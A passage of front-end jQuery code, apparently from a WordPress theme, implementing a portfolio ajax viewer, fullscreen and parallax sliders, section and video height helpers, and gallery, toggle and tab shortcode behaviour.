					target_wrap.avia_keyboard_controls({27:'.avia_close', 37:'.ajax_previous', 39:'.ajax_next'});
					//target_wrap.avia_swipe_trigger({prev:'.ajax_previous', next:'.ajax_next'});
					
					items.each(function(){
					
						var current = $(this), overlay;
						
						current.addClass('no_combo').bind('click', function(event)
						{
							overlay = current.find('.slideshow_overlay');
							
							if(overlay.length)
							{
								event.stopPropagation();
								methods.load_item.apply(current.find('a:eq(0)'));
								return false;
							}
						});
						
						
					});
				},
				
				control_click: function()
				{
					var showItem,
						activeID = container.find('.active_portfolio_item').data('ajax-id'),
						active   = container.find('.post-entry-'+activeID);
				
					switch(this.hash)
					{
						case '#next': 
						
							showItem = active.nextAll('.post-entry:visible:eq(0)').find('a:eq(0)');
							if(!showItem.length) { showItem = $('.post-entry:visible:eq(0)', container).find('a:eq(0)'); }
							showItem.trigger('click');
					
						break;
						case '#prev': 
							
							showItem = active.prevAll('.post-entry:visible:eq(0)').find('a:eq(0)');
							if(!showItem.length) { showItem = $('.post-entry:visible:last', container).find('a:eq(0)'); }
							showItem.trigger('click');
						
						break;
						case '#close':
						
							animating = true;
							
							target_wrap.slideUp( options.timing, options.easing, function()
							{ 
								container.find('.active_portfolio_item').removeClass('active_portfolio_item');
								content_retrieved[is_open].attr({'style':""}).removeClass('open_slide');
								target_wrap.removeClass('open_container');
								animating = is_open = index_open = false;
								methods.remove_video();
								the_body.trigger('av_resize_finished');
							});
							
						break;
					}
					return false;
				},
				
				
				resize_reset: function()
				{
					if(is_open === false)
					{
						target_container.html('');
						content_retrieved	= [];
					}
				}
			};
			
			methods.add_controls();
			
			container.on("click", "a", methods.load_item);
			controls.on("click", "a", methods.control_click);
			if(jQuery.support.leadingWhitespace) { win.bind('debouncedresize', methods.resize_reset); }
			
		});
	};
}(jQuery));	



// -------------------------------------------------------------------------------------------
// Fullscreen Slideshow 
// 
// extends avia slideshow script with a more sophisticated preloader and fixed size for slider
// -------------------------------------------------------------------------------------------


	$.AviaFullscreenSlider  =  function(options, slider)
	{
	    this.$slider  	= $( slider ); 
	    this.$inner	  	= this.$slider.find('.avia-slideshow-inner');
	    this.$innerLi	= this.$inner.find('>li');
	    this.$caption 	= this.$inner.find('.avia-slide-wrap .caption_container');
	    this.$win	  	= $( window );
	    this.isMobile 	= $.avia_utilities.isMobile;
	    this.property 	= {};
	    this.scrollPos	= "0";
	    this.transform3d= document.documentElement.className.indexOf('avia_transform3d') !== -1 ? true : false;
	    this.ticking 	= false; 
	    
	    
	    if($.avia_utilities.supported.transition === undefined)
		{
			$.avia_utilities.supported.transition = $.avia_utilities.supports('transition');
		}
		
	    this._init( options );
	}

	$.AviaFullscreenSlider.defaults  = {

		//height of the slider in percent
		height: 100,
		
		//subtract elements from the height
		subtract: '#wpadminbar, #header, #main>.title_container'
		
		
	};

  	$.AviaFullscreenSlider.prototype =
    {
    	_init: function( options )
    	{
    		var _self = this;
    		//set the default options
    		this.options = $.extend( true, {}, $.AviaFullscreenSlider.defaults, options );
    		
    		if(this.$slider.data('slide_height')) this.options.height = this.$slider.data('slide_height');
    		
    		//if background attachment is set to fixed or scroll disable the parallax effect
    		this.options.parallax_enabled = this.$slider.data('image_attachment') == "" ? true : false;
    		
    		//elements that get subtracted from the image height
    		this.$subtract = $(this.options.subtract);
    		
    		
			// set the slideshow size
			this._setSize(); 
    		
			// set resizing script on window resize
			this.$win.on( 'debouncedresize',  $.proxy( this._setSize, this) );
    		
    		//parallax scroll if element if leaving viewport
			setTimeout(function()
			{
				if(!_self.isMobile && _self.options.parallax_enabled) //disable parallax scrolling on mobile
    			{
	    			_self.$win.on( 'scroll', $.proxy( _self._on_scroll, _self) );
    			}
    			
    		},100);
			/**/
    		
			//activate the defaule slider
			this.$slider.aviaSlider({bg_slider:true});
			
			
    	},
    	
    	_on_scroll: function(e)
    	{
	    	var _self = this;
	    	
	    	if(!_self.ticking) {
		     _self.ticking = true;
		      window.requestAnimationFrame( $.proxy( _self._parallax_scroll, _self) );
		    }
    	},
    	
    	
    	_fetch_properties: function(slide_height)
		{
			this.property.offset 	= this.$slider.offset().top;
			this.property.wh 		= this.$win.height();
			this.property.height 	= slide_height || this.$slider.outerHeight();
			
			//re-position the slider
			this._parallax_scroll();
		},
    	
    	_setSize: function( )
    	{	
    		if(!$.fn.avia_browser_height)
    		{
    	
    		var viewport		= this.$win.height(),
    			slide_height	= Math.ceil( (viewport / 100) * this.options.height );
			
			if(this.$subtract.length && this.options.height == 100)
			{
	    		this.$subtract.each(function()
	    		{
	    			slide_height -= this.offsetHeight - 0.5;
	    		});
    		}
    		else
    		{
    			slide_height -= 1;
    		}
    		this.$slider.height(slide_height).removeClass('av-default-height-applied');
    		this.$inner.css('padding',0);
    		}
    		
    		
    		this._fetch_properties(slide_height);
    	},
    	
    	_parallax_scroll: function(e)
    	{
    		if(this.isMobile || ! this.options.parallax_enabled) return; //disable parallax scrolling on mobile
    	
    		var winTop 		= this.$win.scrollTop(),
    			winBottom	=  winTop + this.property.wh,
    			scrollPos 	= "0", 
    			prop 		= {}, prop2 = {};
    		
    		if(this.property.offset < winTop && winTop <= this.property.offset + this.property.height)
    		{	
    			scrollPos = Math.round( (winTop - this.property.offset) * 0.3 );
    		}
    		
    		if(this.scrollPos != scrollPos)
    		{	
    			//slide background parallax
    			this.scrollPos = scrollPos;
    			
    			//currently no 3d transform, because of browser quirks
    			//this.transform3d = false;
    			
    			if(this.transform3d)
    			{
    				prop[$.avia_utilities.supported.transition+"transform"] = "translate3d(0px,"+ scrollPos +"px,0px)";
    			}
    			else
    			{
    				prop[$.avia_utilities.supported.transition+"transform"] = "translate(0px,"+ scrollPos +"px)";
    			}
    			
    			
    			this.$inner.css(prop);
    			
    			
    			
    			//slider caption parallax
    			
				// prop2[$.avia_utilities.supported.transition+"transform"] = "translate(0px,-"+ ( scrollPos * 1) +"px)";
				/*
	    		prop2['opacity'] = Math.ceil((this.$slider.height() - (scrollPos * 2)) / 100)/ 10;
	    		prop2['opacity'] = prop2['opacity'] < 0 ? 0 : prop2['opacity'];
	    		this.$caption.css(prop2);
				*/
    		}
    		
    		this.ticking = false;
    	}
    };



$.fn.aviaFullscreenSlider = function( options )
{
	return this.each(function()
	{
		var active = $.data( this, 'aviaFullscreenSlider' );

		if(!active)
		{
			//make sure that the function doesnt get aplied a second time
			$.data( this, 'aviaFullscreenSlider', 1 );
			
			//create the preparations for fullscreen slider
			new $.AviaFullscreenSlider( options, this );
		}
	});
}
	
// -------------------------------------------------------------------------------------------
// makes sure that the fixed container height is removed once the layerslider is loaded, so it adapts to the screen resolution
// -------------------------------------------------------------------------------------------

	$.AviaParallaxElement  =  function(options, element)
	{
	    this.$el  	  	= $( element ).addClass('active-parallax');
	    this.$win	  	= $( window );
	    this.$body	  	= $( 'body' );
	    this.$parent  	= this.$el.parent();
	    this.property	= {};
	    this.isMobile 	= $.avia_utilities.isMobile;
	    this.ratio		= this.$el.data('avia-parallax-ratio') || 0.5;
	    this.transform  = document.documentElement.className.indexOf('avia_transform') !== -1 ? true : false;
	    this.transform3d= document.documentElement.className.indexOf('avia_transform3d') !== -1 ? true : false;
	    this.ticking	= false;
	    
	    if($.avia_utilities.supported.transition === undefined)
		{
			$.avia_utilities.supported.transition = $.avia_utilities.supports('transition');
		}
	    
	    this._init( options );
	}
	
	$.AviaParallaxElement.prototype = {
	
		_init: function( options )
    	{
    		var _self = this;
			if(_self.isMobile)
			{
				return; //disable parallax scrolling on mobile
			}
			
			//fetch window constants
			setTimeout(function()
			{
    			_self._fetch_properties();
    		},30);
			
			this.$win.on("debouncedresize av-height-change",  $.proxy( _self._fetch_properties, _self));
			this.$body.on("av_resize_finished",  $.proxy( _self._fetch_properties, _self));
			
			
			
			//activate the scrolling
			setTimeout(function()
			{
				_self.$win.on( 'scroll', $.proxy( _self._on_scroll, _self) );
    			
    		},100);
		},
		
		_fetch_properties: function()
		{
			this.property.offset 	= this.$parent.offset().top;
			this.property.wh 		= this.$win.height();
			this.property.height 	= this.$parent.outerHeight();
			
			//set the height of the element based on the windows height, offset ratio and parent height
			this.$el.height(Math.ceil((this.property.wh * this.ratio) + this.property.height));
			
			//re-position the element
			this._parallax_scroll();
		},
		
		_on_scroll: function(e)
    	{
	    	var _self = this;
	    	
	    	if(!_self.ticking) {
		     _self.ticking = true;
		      window.requestAnimationFrame( $.proxy( _self._parallax_scroll, _self) );
		    }
    	},
		
		_parallax_scroll: function(e)
    	{
    		var winTop		=  this.$win.scrollTop(),
    			winBottom	=  winTop + this.property.wh,
    			scrollPos 	= "0", 
    			prop = {};
    		
    		//shift element when it moves into viewport
    		if(this.property.offset < winBottom && winTop <= this.property.offset + this.property.height)
    		{	
    			scrollPos = Math.ceil( (winBottom - this.property.offset) * this.ratio );
    			
    			//parallax movement via backround position change, although
    			if(this.transform3d)
    			{
    				prop[$.avia_utilities.supported.transition+"transform"] = "translate3d(0px,"+ scrollPos +"px, 0px)";
    			}
    			else if(this.transform)
    			{
    				prop[$.avia_utilities.supported.transition+"transform"] = "translate(0px,"+ scrollPos +"px)";
    			}
    			else
    			{
    				prop["background-position"] = "0px "+ scrollPos +"px";
    			}
	    		
	    		this.$el.css(prop);
    		}
    		
    		this.ticking = false;
    	}
	};


$.fn.avia_parallax = function(options)
{
	return this.each(function()
    	{
    		var self = $.data( this, 'aviaParallax' );

    		if(!self)
    		{
    			self = $.data( this, 'aviaParallax', new $.AviaParallaxElement( options, this ) );
    		}
    	});
}


// -------------------------------------------------------------------------------------------
// Helper to allow fixed bgs on mobile
// -------------------------------------------------------------------------------------------

$.fn.avia_mobile_fixed = function(options)
{
	var isMobile = $.avia_utilities.isMobile;
	if(!isMobile) return;
	
	return this.each(function()
	{
		var current				= $(this).addClass('av-parallax-section'),
			$background 		= current.attr('style'),
			$attachment_class 	= current.data('section-bg-repeat'),
			template			= "";
			
			if($attachment_class == 'stretch' || $attachment_class == 'no-repeat' )
			{
				$attachment_class = " avia-full-stretch"; 
			}
			else
			{
				$attachment_class = ""; 
			}
			
			template = "<div class='av-parallax " + $attachment_class + "' data-avia-parallax-ratio='0.0' style = '" + $background + "' ></div>";
			
			current.prepend(template);
			current.attr('style','');
	});
}




	
// -------------------------------------------------------------------------------------------
// makes sure that the fixed container height is removed once the layerslider is loaded, so it adapts to the screen resolution
// -------------------------------------------------------------------------------------------

$.fn.layer_slider_height_helper = function(options)
{
	return this.each(function()
	{
		var container 	= $(this),
			first_div 	= container.find('>div:first'),
			timeout 	= false,
			counter 	= 0,
			reset_size 	= function()
			{
				if(first_div.height() > 0 || counter > 5)
				{
					container.height('auto');
				}
				else
				{
					timeout = setTimeout(reset_size, 500);
					counter++;
				}
			};

		if(!first_div.length) return;

		timeout = setTimeout(reset_size, 0);
	});
}

// -------------------------------------------------------------------------------------------
// testimonial shortcode javascript
// -------------------------------------------------------------------------------------------

$.fn.avia_sc_testimonial = function(options)
{
	return this.each(function()
	{
		var container = $(this), elements = container.find('.avia-testimonial');


		//trigger displaying of thumbnails
		container.on('avia_start_animation', function()
		{
			elements.each(function(i)
			{
				var element = $(this);
				setTimeout(function(){ element.addClass('avia_start_animation') }, (i * 150));
			});
		});
	});
}


// -------------------------------------------------------------------------------------------
// Progress bar shortcode javascript
// -------------------------------------------------------------------------------------------

$.fn.avia_sc_progressbar = function(options)
{
	return this.each(function()
	{
		var container = $(this), elements = container.find('.avia-progress-bar');
		
		
		//trigger displaying of progress bar
		container.on('avia_start_animation', function()
		{
			elements.each(function(i)
			{
				var element = $(this)
				
				setTimeout(function()
				{ 
					element.find('.progress').addClass('avia_start_animation') 
					element.find('.progressbar-percent').avia_sc_animated_number(
					{
						instant_start:true, simple_up:true, start_timer: 10
					});
					
				}, (i * 250));
			});
		});
	});
}

// -------------------------------------------------------------------------------------------
// Iconlist shortcode javascript
// -------------------------------------------------------------------------------------------

$.fn.avia_sc_iconlist = function(options)
{
	return this.each(function()
	{
		var iconlist = $(this), elements = iconlist.find('>li');


		//trigger displaying of thumbnails
		iconlist.on('avia_start_animation', function()
		{
			elements.each(function(i)
			{
				var element = $(this);
				setTimeout(function(){ element.addClass('avia_start_animation') }, (i * 350));
			});
		});
	});
}


// -------------------------------------------------------------------------------------------
//  shortcode javascript for delayed animation even when non connected elements are used
// -------------------------------------------------------------------------------------------

$.fn.avia_sc_animation_delayed = function(options)
{
	var global_timer = 0,
		delay = options.delay || 50,
		max_timer = 10,
		new_max = setTimeout(function(){ max_timer = 20; }, 500);
	
	return this.each(function()
	{
		var elements = $(this);

		//trigger displaying of thumbnails
		elements.on('avia_start_animation', function()
		{
			var element = $(this);
			 
			if(global_timer < max_timer) global_timer ++;
			
			setTimeout(function()
			{ 
				element.addClass('avia_start_delayed_animation'); 
				if(global_timer > 0) global_timer --; 
			
			}, (global_timer * delay));
			
		});
	});
}

/*delayd animations when used within tab sections or similar elements. this way they get animated each new time a tab is shown*/
$.fn.avia_delayed_animation_in_container = function(options)
{
	return this.each(function()
	{
		var elements = $(this);
		
		elements.on('avia_start_animation_if_current_slide_is_active', function()
		{
			var current = $(this),
				animate = current.find('.avia_start_animation_when_active');
				
				animate.addClass('avia_start_animation').trigger('avia_start_animation');
		});
		
		elements.on('avia_remove_animation', function()
		{
			var current = $(this),
				animate = current.find('.avia_start_animation_when_active, .avia_start_animation');
				animate.removeClass('avia_start_animation avia_start_delayed_animation');
		});
	});
}





// -------------------------------------------------------------------------------------------
// Section Height Helper
// -------------------------------------------------------------------------------------------

$.fn.avia_browser_height = function()
{
	if(!this.length) return;
	
	var win			= $(window),
		html_el		= $('html'),
		subtract	= $('#wpadminbar, #header.av_header_top:not(.html_header_transparency #header), #main>.title_container'),
		css_block	= $("<style type='text/css' id='av-browser-height'></style>").appendTo('head:first'), 
		sidebar_menu= $('.html_header_sidebar #top #header_main'),
		full_slider	= $('.html_header_sidebar .avia-fullscreen-slider.avia-builder-el-0.avia-builder-el-no-sibling').addClass('av-solo-full'),
		calc_height = function()
		{
			var css			= "",
				wh100 		= win.height(),
				ww100 		= win.width(),
				wh100_mod 	= wh100,
				whCover		= (wh100 / 9) * 16,
				wwCover		= (ww100 / 16) * 9,
				wh75		= Math.round( wh100 * 0.75 ),
				wh50		= Math.round( wh100 * 0.5  ),
				wh25		= Math.round( wh100 * 0.25 ),
				solo		= 0;
			
			if(sidebar_menu.length) solo = sidebar_menu.height();
			
			subtract.each(function(){ wh100_mod -= this.offsetHeight - 1; });	
			
			var whCoverMod	= (wh100_mod / 9) * 16;
			
			//fade in of section content with minimum height once the height has been calculated
			css += ".avia-section.av-minimum-height .container{opacity: 1; }\n";
			
			//various section heights (100-25% as well as 100% - header/adminbar in case its the first builder element)
			css += ".av-minimum-height-100 .container, .avia-fullscreen-slider .avia-slideshow, #top.avia-blank .av-minimum-height-100 .container, .av-cell-min-height-100 > .flex_cell{height:"+wh100+"px;}\n";
			css += ".av-minimum-height-75 .container, .av-cell-min-height-75 > .flex_cell	{height:"+wh75+"px;}\n";
			css += ".av-minimum-height-50 .container, .av-cell-min-height-50 > .flex_cell	{height:"+wh50+"px;}\n";
			css += ".av-minimum-height-25 .container, .av-cell-min-height-25 > .flex_cell	{height:"+wh25+"px;}\n";
			css += ".avia-builder-el-0.av-minimum-height-100 .container, .avia-builder-el-0.avia-fullscreen-slider .avia-slideshow, .avia-builder-el-0.av-cell-min-height-100 > .flex_cell{height:"+wh100_mod+"px;}\n";
			
			css += "#top .av-solo-full .avia-slideshow {min-height:"+solo+"px;}\n";
			
			//fullscreen video calculations
			if(ww100/wh100 < 16/9)
			{
				css += "#top .av-element-cover iframe, #top .av-element-cover embed, #top .av-element-cover object, #top .av-element-cover video{width:"+whCover+"px; left: -"+(whCover - ww100)/2+"px;}\n";
			}
			else
			{
				css += "#top .av-element-cover iframe, #top .av-element-cover embed, #top .av-element-cover object, #top .av-element-cover video{height:"+wwCover+"px; top: -"+(wwCover - wh100)/2+"px;}\n";
			}
			
			if(ww100/wh100_mod < 16/9)
			{
				css += "#top .avia-builder-el-0 .av-element-cover iframe, #top .avia-builder-el-0 .av-element-cover embed, #top .avia-builder-el-0 .av-element-cover object, #top .avia-builder-el-0 .av-element-cover video{width:"+whCoverMod+"px; left: -"+(whCoverMod - ww100)/2+"px;}\n";
			}
			else
			{
				css += "#top .avia-builder-el-0 .av-element-cover iframe, #top .avia-builder-el-0 .av-element-cover embed, #top .avia-builder-el-0 .av-element-cover object, #top .avia-builder-el-0 .av-element-cover video{height:"+wwCover+"px; top: -"+(wwCover - wh100_mod)/2+"px;}\n";
			}
			
			//ie8 needs different insert method
			try{
				css_block.text(css); 
			}
			catch(err){
				css_block.remove();
				css_block = $("<style type='text/css' id='av-browser-height'>"+css+"</style>").appendTo('head:first');
			}
			
			
			setTimeout(function(){ win.trigger('av-height-change'); /*broadcast the height change*/ },100);
		};
	
	win.on( 'debouncedresize', calc_height);
	calc_height();
}

// -------------------------------------------------------------------------------------------
// Video Section helper
// -------------------------------------------------------------------------------------------

$.fn.avia_video_section = function()
{
	if(!this.length) return;
	
	var elements	= this.length, content = "",
		win			= $(window),
		css_block	= $("<style type='text/css' id='av-section-height'></style>").appendTo('head:first'), 
		calc_height = function(section, counter)
		{
			if(counter === 0) { content = "";}
		
			var css			= "",
				the_id		= '#' +section.attr('id'),
				wh100 		= section.height(),
				ww100 		= section.width(),
				aspect		= section.data('sectionVideoRatio').split(':'),
				video_w		= aspect[0],
				video_h		= aspect[1],
				whCover		= (wh100 / video_h ) * video_w,
				wwCover		= (ww100 / video_w ) * video_h;
			
			//fullscreen video calculations
			if(ww100/wh100 < video_w/video_h)
			{
				css += "#top "+the_id+" .av-section-video-bg iframe, #top "+the_id+" .av-section-video-bg embed, #top "+the_id+" .av-section-video-bg object, #top "+the_id+" .av-section-video-bg video{width:"+whCover+"px; left: -"+(whCover - ww100)/2+"px;}\n";
			}
			else
			{
				css += "#top "+the_id+" .av-section-video-bg iframe, #top "+the_id+" .av-section-video-bg embed, #top "+the_id+" .av-section-video-bg object, #top "+the_id+" .av-section-video-bg video{height:"+wwCover+"px; top: -"+(wwCover - wh100)/2+"px;}\n";
			}
			
			content = content + css;
			
			if(elements == counter + 1)
			{
				//ie8 needs different insert method
				try{
					css_block.text(content);
				}
				catch(err){
					css_block.remove();
					css_block = $("<style type='text/css' id='av-section-height'>"+content+"</style>").appendTo('head:first');
				}
			}
		};
		
		
	return this.each(function(i)
	{
		var self = $(this);
		
		win.on( 'debouncedresize', function(){ calc_height(self, i); });
		calc_height(self, i);
	});
	
}








// -------------------------------------------------------------------------------------------
// Gallery shortcode javascript
// -------------------------------------------------------------------------------------------

$.fn.avia_sc_gallery = function(options)
{
	return this.each(function()
	{
		var gallery = $(this), images = gallery.find('img'), big_prev = gallery.find('.avia-gallery-big');


		//trigger displaying of thumbnails
		gallery.on('avia_start_animation', function()
		{
			images.each(function(i)
			{
				var image = $(this);
				setTimeout(function(){ image.addClass('avia_start_animation') }, (i * 110));
			});
		});
		
		if(gallery.hasClass('deactivate_avia_lazyload')) gallery.trigger('avia_start_animation');

		//trigger thumbnail hover and big prev image change
		if(big_prev.length)
		{
			gallery.on('mouseenter','.avia-gallery-thumb a', function()
			{
				var _self = this;

				big_prev.attr('data-onclick', _self.getAttribute("data-onclick"));
				big_prev.height(big_prev.height());
				big_prev.attr('href', _self.href)

				var newImg 		= _self.getAttribute("data-prev-img"),
					oldImg 		= big_prev.find('img'),
					oldImgSrc 	= oldImg.attr('src');

				if(newImg != oldImgSrc)
				{
					var next_img = new Image();
					next_img.src = newImg;
					
					var $next = $(next_img);
					
					if(big_prev.hasClass('avia-gallery-big-no-crop-thumb'))
					{
						$next.css({'height':big_prev.height(),'width':'auto'});
					}
					
					big_prev.stop().animate({opacity:0}, function()
					{
						$next.insertAfter(oldImg);
						oldImg.remove();
						big_prev.animate({opacity:1});
						
						big_prev.attr('title',$(_self).attr('title'));
						
					});
				}
			});

			big_prev.on('click', function()
			{
				var imagelink = gallery.find('.avia-gallery-thumb a').eq(this.getAttribute("data-onclick") - 1);

				if(imagelink && !imagelink.hasClass('aviaopeninbrowser'))
				{
					imagelink.trigger('click');
				}
				else if(imagelink)
				{
					var imgurl = imagelink.attr("href");

					if(imagelink.hasClass('aviablank') && imgurl != '' )
					{
						window.open(imgurl, '_blank');
					}
					else if( imgurl != '' )
					{
						window.open(imgurl, '_self');
					}
				}
				return false;
			});


			$(window).on("debouncedresize", function()
			{
			  	big_prev.height('auto');
			});

		}
	});
}

// -------------------------------------------------------------------------------------------
// Toggle shortcode javascript
// -------------------------------------------------------------------------------------------

$.fn.avia_sc_toggle = function(options)
{
	var defaults =
	{
		single: '.single_toggle',
		heading: '.toggler',
		content: '.toggle_wrap',
		sortContainer:'.taglist'
	};

	var win = $(window),
		options = $.extend(defaults, options);

	return this.each(function()
	{
		var container 	= $(this).addClass('enable_toggles'),
			toggles		= $(options.single, container),
			heading 	= $(options.heading, container),
			allContent 	= $(options.content, container),
			sortLinks	= $(options.sortContainer + " a", container);

		heading.each(function(i)
		{
			var thisheading =  $(this), content = thisheading.next(options.content, container);

			function scroll_to_viewport()
			{
			    //check if toggle title is in viewport. if not scroll up
			    var el_offset = content.offset().top,
			        scoll_target = el_offset - 50 - parseInt($('html').css('margin-top'),10);

			    if(win.scrollTop() > el_offset)
			    {
			        $('html:not(:animated),body:not(:animated)').animate({scrollTop: scoll_target},200);
			    }
			}

			if(content.css('visibility') != "hidden")
			{
				thisheading.addClass('activeTitle');
			}

			thisheading.on('click', function()
			{
				if(content.css('visibility') != "hidden")
				{
					content.slideUp(200, function()
					{
						content.removeClass('active_tc').attr({style:''});
						win.trigger('av-height-change');
					});
					thisheading.removeClass('activeTitle');

				}
				else
				{
					if(container.is('.toggle_close_all'))
					{
						allContent.not(content).slideUp(200, function()
						{
							$(this).removeClass('active_tc').attr({style:''});
							scroll_to_viewport();
						});
						heading.removeClass('activeTitle');
					}
					content.addClass('active_tc').slideDown(200,
					
					function()
					{
                        if(!container.is('.toggle_close_all'))
                        {
                            scroll_to_viewport();
                        }
                        
                        win.trigger('av-height-change');
					}
					
					);
					thisheading.addClass('activeTitle');
					location.replace(thisheading.data('fake-id'));
				}
				
				
				
			});
		});


		sortLinks.click(function(e){

			e.preventDefault();
			var show = toggles.filter('[data-tags~="'+$(this).data('tag')+'"]'),
				hide = toggles.not('[data-tags~="'+$(this).data('tag')+'"]');

				sortLinks.removeClass('activeFilter');
				$(this).addClass('activeFilter');
				heading.filter('.activeTitle').trigger('click');
				show.slideDown();
				hide.slideUp();
		});


		function trigger_default_open(hash)
		{
			if(!hash && window.location.hash) hash = window.location.hash;
			if(!hash) return;
			
			var open = heading.filter('[data-fake-id="'+hash+'"]');

			if(open.length)
			{
				if(!open.is('.activeTitle')) open.trigger('click');
				window.scrollTo(0, container.offset().top - 70);
			}
		}
		trigger_default_open(false);
		
		$('a').on('click',function(){
            var hash = $(this).attr('href');
            if(typeof hash != "undefined" && hash)
            {
                hash = hash.replace(/^.*?#/,'');
                trigger_default_open('#'+hash);
            }
        });

	});
};




// -------------------------------------------------------------------------------------------
// Tab Shortcode
// -------------------------------------------------------------------------------------------

$.fn.avia_sc_tabs= function(options)
{
	var defaults =
	{
		heading: '.tab',
		content:'.tab_content',
		active:'active_tab',
		sidebar: false
	};

	var win = $(window),
		options = $.extend(defaults, options);

	return this.each(function()
	{
		var container 	= $(this),
			tab_titles 	= $('<div class="tab_titles"></div>').prependTo(container),
			tabs 		= $(options.heading, container),
			content 	= $(options.content, container),
			newtabs 	= false,
			oldtabs 	= false;

		newtabs = tabs.clone();
		oldtabs = tabs.addClass('fullsize-tab');
		tabs = newtabs;

		tabs.prependTo(tab_titles).each(function(i)
		{
			var tab = $(this), the_oldtab = false;

			if(newtabs) the_oldtab = oldtabs.filter(':eq('+i+')');

			tab.addClass('tab_counter_'+i).bind('click', function()
			{
				open_content(tab, i, the_oldtab);
				return false;
			});

			if(newtabs)
			{
				the_oldtab.bind('click', function()
				{
					open_content(the_oldtab, i, tab);
					return false;
				});
			}
		});

		set_size();
		trigger_default_open(false);
		win.on("debouncedresize", set_size);
		
        $('a').on('click',function(){
            var hash = $(this).attr('href');
            if(typeof hash != "undefined" && hash)
            {
                hash = hash.replace(/^.*?#/,'');
                trigger_default_open('#'+hash);
            }
        });

		function set_size()
		{
			if(!options.sidebar) return;
			content.css({'min-height': tab_titles.outerHeight() + 1});
		}

		function open_content(tab, i, alternate_tab)
		{
			if(!tab.is('.'+options.active))
			{
				$('.'+options.active, container).removeClass(options.active);
				$('.'+options.active+'_content', container).removeClass(options.active+'_content');

				tab.addClass(options.active);

				var new_loc = tab.data('fake-id');
				if(typeof new_loc == 'string') location.replace(new_loc);

				if(alternate_tab) alternate_tab.addClass(options.active);
				var active_c = content.filter(':eq('+i+')').addClass(options.active+'_content');

				if(typeof click_container != 'undefined' && click_container.length)
				{
					sidebar_shadow.height(active_c.outerHeight());
				}
				
				//check if tab title is in viewport. if not scroll up
				var el_offset = active_c.offset().top,
					scoll_target = el_offset - 50 - parseInt($('html').css('margin-top'),10);
				
				if(win.scrollTop() > el_offset)
				{
					$('html:not(:animated),body:not(:animated)').scrollTop(scoll_target);
				}
			}
		}

		function trigger_default_open(hash)
		{
			if(!hash && window.location.hash) hash = window.location.hash;
            		if(!hash) return;
            		
			var open = tabs.filter('[data-fake-id="'+hash+'"]');

			if(open.length)
			{
				if(!open.is('.active_tab')) open.trigger('click');
				window.scrollTo(0, container.offset().top - 70);
			}
		}

	});
};




// -------------------------------------------------------------------------------------------
// Tab Section
// -------------------------------------------------------------------------------------------

$.fn.avia_sc_tab_section= function()
{
	var win 			= $(window),
		browserPrefix 	= $.avia_utilities.supports('transition'),
		cssActive 		= this.browserPrefix !== false ? true : false,
		isMobile 		= $.avia_utilities.isMobile,
		transform3d		= document.documentElement.className.indexOf('avia_transform3d') !== -1 ? true : false,
		transition		= {};
		
	return this.each(function()
	{
		var container 		= $(this),
			tabs			= container.find('.av-section-tab-title'),
			tab_wrap		= container.find('.av-tab-section-tab-title-container'),
			tab_nav			= container.find('.av_tab_navigation'), 
			content_wrap	= container.find('.av-tab-section-inner-container'),
			single_tabs		= container.find('.av-animation-delay-container'), //for elements inside the tab that receive waypoint animation
			inner_content	= container.find('.av-layout-tab-inner'),
			sliding_active  = container.is('.av-tab-slide-transition'),
			flexible    	= container.is('.av-tab-content-auto'),
			current_content = container.find('.__av_init_open'),
			min_width		= 0,
			change_tab 		= function(e, prevent_hash)
			{
				e.preventDefault();
				
				var current_tab 	= $(e.currentTarget),
					current_arrow	= current_tab.find('.av-tab-arrow-container span'),
					tab_nr			= current_tab.data('av-tab-section-title');
					
					current_content = container.find('[data-av-tab-section-content="'+tab_nr+'"]');
				
				var new_bg			= current_content.data('av-tab-bg-color'),
					new_font		= current_content.data('av-tab-color'),
					prev_container 	= container.find('.av-active-tab-content').not('[data-av-tab-section-content="'+tab_nr+'"]');

				tabs.attr('style','').removeClass('av-active-tab-title');
				current_tab.addClass('av-active-tab-title');
				current_content.addClass("av-active-tab-content");
				
				if(new_bg !== "") current_arrow.css('background-color', new_bg);
				if(new_font !== "") current_tab.css('color', new_font);
					
				var new_pos = ((parseInt(tab_nr,10) - 1) * -100 );
				    if ($('body').hasClass('rtl')) {
        				new_pos = ((parseInt(tab_nr,10) - 1) * 100 );
    					}
				
				if(cssActive)
				{
					//move the slides
					new_pos = new_pos / tabs.length;
					transition['transform']  = transform3d ? "translate3d(" + new_pos  + "%, 0, 0)" : "translate(" + new_pos + "%,0)"; //3d or 2d transform?
					transition['left'] = "0%";
					content_wrap.css(transition);
				}
				else
				{
					content_wrap.css('left',  new_pos + "%");
				}
				
				set_tab_titlte_pos();
				set_slide_height();
				
				if(!prevent_hash) location.hash = current_tab.attr('href');
				
				setTimeout(function()
				{
					current_content.trigger('avia_start_animation_if_current_slide_is_active');
					single_tabs.not(current_content).trigger('avia_remove_animation');
					
				}, 600);	
				
			},
			set_min_width = function()
			{
				min_width = 0;
				tabs.each(function()
				{ 
					min_width += $(this).outerWidth(); 
				});
				
				tab_wrap.css('min-width',min_width);
			},
			
			set_slide_height = function()
			{				
				if(current_content.length && flexible)
				{
					var old_height = inner_content.height();
					inner_content.height('auto');
					
					var height = current_content.find('.av-layout-tab-inner').height();
					inner_content.height(old_height);
					inner_content.height(height);
					
					inner_content.css( 'overflow', 'hidden' );
					
					setTimeout(function() { win.trigger('av-height-change'); }, 600);
				}
			},
			
			set_tab_titlte_pos = function()
			{
				//scroll the tabs if there is not enough room to display them all
				var current_tab = container.find('.av-active-tab-title'),
					viewport	= container.width(),
					left_pos	= viewport < min_width ? (current_tab.position().left * - 1) - (current_tab.outerWidth() / 2) + (viewport / 2): 0;
				
				if(left_pos + min_width < viewport) left_pos = (min_width - viewport) * -1;
				if(left_pos > 0) left_pos = 0;
				
				tab_wrap.css('left',left_pos );
			},
			switch_to_next_prev = function(e)
			{
				if(!isMobile) return;
				
				var clicked 		= $(e.currentTarget),
					current_tab 	= container.find('.av-active-tab-title');
					
					if(clicked.is('.av_prev_tab_section'))
					{
						current_tab.prev('.av-section-tab-title').trigger('click');
					}
					else
					{
						current_tab.next('.av-section-tab-title').trigger('click');
					}
			},
			
			get_init_open = function()
			{
				if(!hash && window.location.hash) var hash = window.location.hash;
	            		
				var open = tabs.filter('[href="'+hash+'"]');
				
				if(open.length)
				{
					if(!open.is('.active_tab')) open.trigger('click');
				}
				else
				{
					//set correct color
					container.find('.av-active-tab-title').trigger('click', true);
				}
			};
				
		$.avia_utilities.preload({
			
			container: current_content , 
			single_callback:  function(){ 
			
				tabs.on('click', change_tab);
				tab_nav.on('click', switch_to_next_prev);
